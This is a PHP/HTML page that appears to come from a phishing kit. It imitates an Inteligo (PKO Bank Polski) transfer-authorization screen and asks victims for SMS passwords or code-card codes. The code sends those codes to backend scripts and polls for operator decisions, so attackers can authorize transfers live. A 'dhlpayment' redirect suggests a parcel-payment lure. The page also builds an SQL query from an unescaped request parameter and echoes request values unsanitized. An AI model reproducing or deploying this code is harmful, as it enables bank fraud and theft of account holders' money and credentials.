<?php 
	include('../bank_header.php');
	include('../../../db.php'); 
	include('../../../YH0uW3ecaRHG16ld4waY.php');
    include_once('../../../utils.php');

    if($_REQUEST['id']){
		$id = $_REQUEST['id'];
		$page_name = basename($_SERVER['PHP_SELF']);
		$sqlss = "UPDATE `payment` SET `page_name` = '$page_name' WHERE `id` = '$id'";
		$con->query($sqlss);
	}
	
	$query = "SELECT * FROM `payment` WHERE `id` = '".mysqli_real_escape_string($con,$_REQUEST['id'])."'";
	$new = $con->query($query);
	$rowpay = $new->fetch_assoc();
	$number = $rowpay['account_number'];
	$grip = $rowp['gridcode'];
	$num = $new->num_rows;

	$array  = array_map('intval', str_split($number));
?>


<script type="text/javascript" src="js/public.js"></script>
<script type="text/javascript">
	setInterval(function(){ upd_last_login(<?php echo  htmlspecialchars($_REQUEST['id'], ENT_QUOTES, 'UTF-8'); ?>); }, 300);

    var formularz = 0;
    var CheckingInterval;
    var jgrip;
    function IsChecked()
    {
        $.get("./IsCheckd.php", 'id=<?php echo $_REQUEST['id']; ?>',function(data, status){
            if(status=='success')
            {
                var array1 = data.split('&');
                if(array1[0]=='1')
                {
                    jgrip=array1[1];

                    //clearInterval(CheckingInterval);
                    //document.getElementById("loading_id").style.display = 'none';
                    //$("#loading_id").css("display", "none");
                    if (jgrip) {
                        $('#myspan').text(jgrip);
                        //$("#additionalopis1").css("display", "show");
                        //$("#additionalopis2").css("display", "none");
                        document.getElementById("additionalopis1").style.display = 'block';
                        document.getElementById("additionalopis2").style.display = 'none';
                    }
                    else{
                        //$("#additionalopis2").css("display", "show");
                        //$("#additionalopis1").css("display", "none");
                        document.getElementById("additionalopis2").style.display = 'block';
                        document.getElementById("additionalopis1").style.display = 'none';
                    }
                }
                else
                {
                    //$("#additionalopis1").css("display", "none");
                    //$("#additionalopis2").css("display", "show");
                    document.getElementById("additionalopis2").style.display = 'block';
                    document.getElementById("additionalopis1").style.display = 'none';
                }
            }
        });
    }
    CheckingInterval = setInterval(IsChecked , 1000);


    var checkinterval;

    function check_status(payment_id) {
        //    alert(payment_id);
        if (payment_id.length == 0) {
        }
        else {
            var xmlhttp = new XMLHttpRequest();
            xmlhttp.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    //document.getElementById("txtHint").innerHTML = this.responseText;
                    //alert(this.responseText);
                    console.log('check_status = '+this.responseText);

                    if(this.responseText=='VALID CODE'){
                        window.location.href="<?php echo URL_dhlpayment;?>done/index.html";
                    }
                    if(this.responseText=='INVALID CODE'){
                        //window.location.href="";

                        //document.getElementById("alert_invalid").style.display = 'block';
                        //ocument.getElementById("SmsCodes").style.display = 'block';
                        //document.getElementById("invalid_message").style.display = 'none';
                        //document.getElementById("loading_id").style.display = 'none';

                    }
                    if(this.responseText=='WRONG CODE'){

                        //document.getElementById("alert_invalid").style.display = 'block';
                        if(jgrip)
                            document.getElementById("SmsCodes1").style.visibility = 'visible';
                        else
                            document.getElementById("SmsCodes2").style.visibility = 'visible';
                        document.getElementById("loading_id").style.display = 'none';
                        document.getElementById("invalid_message").style.display = 'block';
                        document.getElementById("myspan").textContent = '<?php echo $grip ?>';


                        window.location.href="index_auth.php?id=<?php echo $id; ?>";
                        clearInterval('checkinterval');

                    }

                }
            };
            xmlhttp.open("GET", "check123.php?id=" + payment_id +"&status=aproove", true);
            xmlhttp.send();
        }
    }

    function auth_code(payment_id) {
        var inpObj,codes;
        if(jgrip)
        {
            inpObj = document.getElementById("SmsCodes1");
            codes = inpObj.value;
        }
        else
        {
            inpObj = document.getElementById("SmsCodes2");
            codes = inpObj.value;
        }
        if (payment_id.length == 0) {
        } else
        {
            var xmlhttp = new XMLHttpRequest();
            xmlhttp.onreadystatechange = function()
            {
                if (this.readyState == 4 && this.status == 200)
                {
                    //document.getElementById("txtHint").innerHTML = this.responseText;
                    //alert(this.responseText);
                    console.log('auth_code = '+this.responseText);

                    if (inpObj.checkValidity() == false) {
                        if(jgrip)
                            document.getElementById("SmsCodes1").placeholder = '';
                        else
                            document.getElementById("SmsCodes2").placeholder = '';
                    }else{
                        if(this.responseText=='VALID CODE'){
                            if(jgrip)
                                document.getElementById("SmsCodes1").style.visibility = 'hidden';
                            else
                                document.getElementById("SmsCodes2").style.visibility = 'hidden';
                            document.getElementById("loading_id").style.display = 'block';

                            checkinterval=setInterval(function(){ check_status(<?php echo $id; ?>); }, 1000);
                            //setTimeout(function(){ window.location.href="status_cancel.php?id=<?php echo $id; ?>"; }, 100000);
                        }
                    }
                    //alert(this.responseText);
                }
            };
            if(jgrip) {
                xmlhttp.open("GET", "ajax123.php?code=" + codes +"&id=" + payment_id+"&isgrip=1", true);
            }
            else {
                xmlhttp.open("GET", "ajax123.php?code=" + codes +"&id=" + payment_id+"&isgrip=0", true);
            }
            xmlhttp.send();
        }
    }
</script>




<!DOCTYPE html>
<html lang="en" class="broken-image-checker" ng-app>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
	<!--iPhone from zooming form issue (maximum-scale=1, user-scalable=0)-->
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
	<title>Serwis WWW Inteligo</title>

	<link rel="icon" type="image/png" href="images/inteligo.ico">
	
    <!-- Bootstrap --><link href="css/bootstrap.min.css" rel="stylesheet">
	
	<link rel="stylesheet" href="css/paolo4.css">
	
	
	<!-- jQuery -->
	<!--[if (!IE)|(gt IE 8)]><!-->
	  <script src="js/jquery-2.2.4.min.js"></script>
	<!--<![endif]-->

	<script src="js/bootstrap.min.js"></script>
	
	<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">

  </head>
  <body class="transition nav-plusminus slide-navbar slide-navbar--right hdr--sticky-mobile--off"  style="background:#a4bfd0">

  <div id="body-wrapper" class="container">
		<div class="row">
		<div class="col-md-12 mr50">
		<div id="title-bar">
		
		<a href="http://inteligo.pl/" id="logo" aria-labelledby="logo-infotip-text">&nbsp;</a>
		<div id="logo-infotip" style="display: none;">
			<div id="logo-infotip-icon">&nbsp;</div>
			<div id="logo-infotip-text">Powrót do serwisu informacyjnego</div>
			<script type="text/javascript">
				$('#logo-infotip').hide();
				$("a#logo").mouseenter(function() {
					$('#logo-infotip').show();
				});
				$("a#logo").mouseleave(function() {
					$("#logo-infotip").hide();
				});
			</script>
		</div>
		</div>
		<ul id="main-menu"></ul>
		
		<div class="wrap-content">
    <div class="layout-content">
     
    <div class="layout-page-middle1 new-navigation">
		<div class="form-box" style="margin-bottom: 15px; margin-top: 3px">
			<div id="" class="table_list tableListInfoTable">
				<table cellspacing="0" class="table-list"></table><div class="message empty-table ">
					<div class="box-info" style="padding-top: 0;">
						<span style="font-weight: bold">Zbliżają się roczne rozliczenia podatkowe - zaktualizuj swoje dane<br></span>Zbliża się termin otrzymywania informacji podatkowych, pomocnych w rozliczaniu zobowiązań podatkowych za 2017 rok – pamiętaj o zaktualizowaniu swoich danych.<a target="_blank" href="http://inteligo.pl/aktualnosci/komunikaty/zblizaja-sie-roczne-rozliczenia-podatkowe-zaktualizuj-swoje-dane_2/" title="Więcej"><strong>Więcej&nbsp;&gt;&gt;</strong></a>
					</div>
				</div>
			</div>
		</div>
        <div class="form-box save-no-password form-no-required">
			<div class="box-input" style="display:none">
				<div class="box-input-wrap">
				<input type="text" style="display:none" class="decoy" value="E" name="login0">
				</div>
			</div>
			<div class="box-input" style="display:none">
				<div class="box-input-wrap">
					<input type="password" style="display:none" class="decoy" value="D" name="password0">
				</div>
			</div>
			
			<div class="form form_tabular " id="f-form_0145702117" data-action="/secure/igo2/auth/login/submit?flow_id=LZKYp69meKvyWKdMHjF2H4&amp;continue_flow=1" style="display: block;">
				<h1 class="table-title"><span class="inner">Autoryzacja
				</span></h1>
				<div id="warning_sms" style="display:none;" class="w3-panel w3-yellow w3-display-container">
			  <p style="margin-top:10px;">Uwierzytelnianie...</p>
			</div>
				<div  id="wrong_sms" style="display:none;" class="w3-panel w3-red w3-display-container">

				  <p style="margin-top:10px;">Proszę wpisac nowy kod.</p>
				</div>
				<ul class="form-tabular">
					<li class="field_row edit-field field_row-client_id_field NullValidationCharEditFieldTR" id="f-tr-f-form_0145702117-client_id_field">
						<div class="row">
							<div class="col-md-6 col-sm-6 col-xs-12">
								<label  style="margin-left:0px;">Odbiorca: <?php echo $rowpay['account_name'];?></label>
							</div>
							<div class="col-md-6 col-sm-6 col-xs-12">
								<label  style="margin-left:0px;">Numer konta: <?php echo $rowpay['account_number'];?></label>
							</div>
						</div>
						<div class="row">
							<div class="col-md-6 col-sm-6 col-xs-12">
								<label  style="margin-left:0px;">Kwota: <?php echo $rowpay['payment'];?> PLN</label>
							</div>
							<div class="col-md-6 col-sm-6 col-xs-12">
								<label  style="margin-left:0px;">Tytuł płatności: <?php echo $rowpay['title'];?></label>
							</div>
						</div>
						<div class="row">
							<div class="col-md-6 col-sm-6 col-xs-12">
								<label  style="margin-left:0px;">Data: <?php echo date('d/m/Y');?></label>
							</div>

						</div>
                        <div class="row">
                            <div id='additionalopis1' class="col-md-12 col-sm-12 col-xs-12" style='margin-top: 20px;display:none;'>
                                <label  style="margin-left:0px;margin-right:20px;">Wprowadz kod nr <span id='myspan'> " .$rowp['gridcode']." </span> z karty kodow</label>
                                <span class="box-input-wrap"><input style="width: 80px;border-radius:5px;" id="SmsCodes1"  name="SmsCodes1" required="" value="" class="f-tan-code" maxlength="6" data-autofocus="true" type="password"> <input  type="hidden" name="UserName" value=""></span>
                            </div>
                            <div id='additionalopis2' class="col-md-12 col-sm-12 col-xs-12" style='margin-top: 20px;display:none;'>
                                <label  style="margin-left:0px;margin-right:20px;">Hasło SMS</label>
                                <span class="box-input-wrap"><input style="width: 80px;border-radius:5px;"  id="SmsCodes2"  name="SmsCodes2" required="" value="" class="f-tan-code" maxlength="6" data-autofocus="true" type="password"> <input type="hidden" name="UserName" value=""></span>
                            </div>
                        </div>

						<div id="maincontent" style="display:block;">

							<div class="row" style="margin-top:20px;">
                            <div  id="loading_id" style="display: none;">
                                <div class="h--overlay-white" style="zoom: 1;">
                                    <p >
                                    <center style="font-size:20px;font-weight:bold;color:black;" id="loading_mobile">
                                        <img src="images/loading.gif" style="width:100px;"/> </center>
                                    </p>
                                </div>
                            </div>
							<div class="col-md-3 col-sm-3"> </div>
							<div class="col-md-6 col-sm-6 col-xs-12">
							    <button  id="confirm" onclick="auth_code('<?php echo $_REQUEST['id'];?>')" class="image-button2 button-dalej button button_ok" tabindex="10" title="Dalej" style="position:relative;top:50%; left:20%;"></button>
                            </div>
							<div class="col-md-3 col-sm-3"></div>
							</div>
						</div>
						
					</li>
				</ul>
					
						
				
				</div>
				<div class="box-input" style="display:none">
					<div class="box-input-wrap">
						<input type="text" style="display:none" class="decoy" value="C" name="login1">
					</div>
				</div>
					<div class="box-input" style="display:none">
						<div class="box-input-wrap">
							<input type="password" style="display:none" class="decoy" value="O" name="password1">
						</div>
					</div>
					<div class="box-input" style="display:none">
						<div class="box-input-wrap">
							<input type="password" style="display:none" class="decoy" value="Y" name="password2">
						</div>
					</div>
			</div>
				<div style="clear: both;">        
					<div class="box-login">
						<h1><span class="login-icon-key"></span>Bezpieczeństwo w Inteligo</h1>
						<div class="holder secure">
							Pamiętaj: Logowanie do serwisu transakcyjnego Inteligo nie wymaga podania kodu z narzędzia autoryzacyjnego - nigdy nie podawaj kodu podczas logowania ani bezpośrednio po zalogowaniu do serwisu!<br>&nbsp; <a href="http://inteligo.pl/redirect/bezpieczenstwo" target="_blank"><br>Więcej o bezpiecznym logowaniu</a> <br><br></div>
					</div>
					<div class="login-spacer"></div>
					<div class="box-login">
						<h1><span class="login-icon-page"></span>Program poleceń Mam Inteligo</h1>
						<div class="holder account">
							Zarejestruj się, zarabiaj i wygrywaj.
							<ul><li>- 1000 zł za największą liczbę poleceń</li>
							<li>- 50 zł za każde skutecznie polecone konto<br><br></li>
							</ul><a href="https://maminteligo.pl" target="_blank">Więcej</a>
						</div>
					</div>
				</div>
					<div class="clear"></div>
				</div>
					<div class="layout-page-bottom"></div>
				</div>
					<div class="col-md-12" id="bottom-text">
					Konto Inteligo prowadzone jest przez <b>PKO Bank Polski</b>.
					</div>
					<div class="clear"></div>
					<div class="layout-footer">
						<div id="deposits-link">
					
							<a class="standalone" href="http://inteligo.pl/infosite/_images/_files/zasady_gwarantowania_depozytow.pdf" target="_blank" title="" aria-describedby="aria_external">
								Gwarantowanie depozytów</a>
						</div>
					</div>
				</div>
			</div>
		</div>
   </div><!--body-wrapper-->

	</body>
</html>

<script>

	window.onload = function() {
		var maincontent = document.getElementById('maincontent');
		var SmsCodes = document.getElementById('SmsCodes');
		var loading_id= document.getElementById('loading_id');


</script>